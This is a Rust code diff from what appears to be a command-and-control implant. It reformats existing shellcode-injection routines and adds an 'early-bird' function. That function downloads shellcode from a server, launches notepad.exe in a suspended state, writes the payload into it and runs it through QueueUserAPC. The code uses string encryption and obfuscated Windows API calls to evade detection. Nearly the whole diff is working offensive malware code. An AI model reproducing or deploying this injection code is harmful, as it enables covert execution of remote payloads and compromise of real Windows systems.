@@ -1,10 +1,9 @@
-
 pub mod command {
-    use litcrypt::lc;
-    use std::ptr::{null, null_mut};
     use crate::obfwin::Constants::*;
     use crate::obfwin::Functions::*;
-    
+    use litcrypt::lc;
+    use std::ptr::{null, null_mut};
+
     fn get_file_vec(
         base_url: &str,
         file_name: &str,
@@ -64,8 +63,12 @@ pub mod command {
             // If specified to use RW memory, allocate, copy, change to RX, execute
             if memory_permissions == "RW" {
                 // Allocate some RW
-                let dest =
-                    (kernel32.VirtualAlloc)(null(), file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                let dest = (kernel32.VirtualAlloc)(
+                    null(),
+                    file_size,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_READWRITE,
+                );
                 // Copy the shellcode in there
                 (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
                 // Re-protect as exec-read
@@ -99,7 +102,7 @@ pub mod command {
     ) -> String {
         // Get the file off the server
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
-        
+
         let file_bytes: &[u8] = &file_vec;
         let file_size = file_bytes.len();
 
@@ -123,7 +126,13 @@ pub mod command {
                 let mut old_perm = PAGE_READWRITE;
 
                 // Allocate inside of the target pid process
-                let dest = (kernel32.VirtualAllocEx)(handle, null(), file_size, MEM_COMMIT, PAGE_READWRITE);
+                let dest = (kernel32.VirtualAllocEx)(
+                    handle,
+                    null(),
+                    file_size,
+                    MEM_COMMIT,
+                    PAGE_READWRITE,
+                );
                 // Write memory inside of targed pid
                 (kernel32.WriteProcessMemory)(
                     handle,
@@ -133,7 +142,13 @@ pub mod command {
                     null_mut(),
                 );
                 // Re-protect it as PAGE_EXECUTE_READ
-                (kernel32.VirtualProtectEx)(handle, dest, file_size, PAGE_EXECUTE_READ, &mut old_perm);
+                (kernel32.VirtualProtectEx)(
+                    handle,
+                    dest,
+                    file_size,
+                    PAGE_EXECUTE_READ,
+                    &mut old_perm,
+                );
                 // Spawn the thread
                 (kernel32.CreateRemoteThread)(handle, null(), 0, dest, null(), 0, null_mut());
             } else {
@@ -160,5 +175,100 @@ pub mod command {
             (kernel32.CloseHandle)(handle);
         }
         lc!("Shellcode successfully executed")
+    }
+
+    pub fn shellcode_earlybird(
+        base_url: &str,
+        cookie_header: &reqwest::header::HeaderValue,
+        file_name: &str,
+        memory_permissions: &str,
+    ) -> String {
+        // Get the file off the server
+        let file_vec = get_file_vec(base_url, file_name, cookie_header);
+
+        let file_bytes: &[u8] = &file_vec;
+        let file_size = file_bytes.len();
+
+        unsafe {
+   
+            let kernel32 = &*OBF_KERNEL32;
+
+            let mut old_perm = PAGE_READWRITE;
+
+            // Fingers crossed custom STARTUPINFOA works
+            let mut si: STARTUPINFOA = std::mem::zeroed();
+            si.cb = 96;
+            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+
+            let c_ptr_to_program_to_start = b"notepad.exe\0";
+            let ptr_si: *const i8 = std::mem::transmute(&si);
+            let ptr_pi: *const i8 = std::mem::transmute(&pi);
+
+            let result = (kernel32.CreateProcessA)(null(), c_ptr_to_program_to_start.as_ptr().cast(), null(), null(), 0, CREATE_SUSPENDED, null(), null(), ptr_si, ptr_pi);
+
+            // If specified to use RW memory, allocate, copy, change to RX, execute
+            if memory_permissions == "RW" {
+                let dest = (kernel32.VirtualAllocEx)(
+                    pi.hProcess,
+                    null(),
+                    file_size,
+                    MEM_COMMIT,
+                    PAGE_READWRITE,
+                );
+                _ = (kernel32.WriteProcessMemory)(
+                    pi.hProcess,
+                    dest,
+                    file_bytes.as_ptr().cast(),
+                    file_size,
+                    null_mut(),
+                );
+                _ = (kernel32.VirtualProtectEx)(
+                    pi.hProcess,
+                    dest,
+                    file_size,
+                    PAGE_EXECUTE_READ,
+                    &mut old_perm,
+                );
+                _ = (kernel32.QueueUserAPC)(
+                    dest,
+                    pi.hThread,
+                    null()
+                );
+                _ = (kernel32.ResumeThread)(pi.hThread);
+            } else { // Just allocate RWX and copy into it
+                let dest = (kernel32.VirtualAllocEx)(
+                    pi.hProcess,
+                    null(),
+                    file_size,
+                    MEM_COMMIT,
+                    PAGE_EXECUTE_READWRITE,
+                );
+                _ = (kernel32.WriteProcessMemory)(
+                    pi.hProcess,
+                    dest,
+                    file_bytes.as_ptr().cast(),
+                    file_size,
+                    null_mut(),
+                );
+                _ = (kernel32.QueueUserAPC)(
+                    dest,
+                    pi.hThread,
+                    null()
+                );
+                _ = (kernel32.ResumeThread)(pi.hThread);
+            }
+
+            lc!("Successfully spawned notepad.exe and injected the requested shellcode")
+        }
+
+    }
+
+    pub fn kill(
+        kill_id: &str
+    ) -> String {
+        
+        // Send back the kill_id
+
+        return kill_id.to_string();
     }
 }
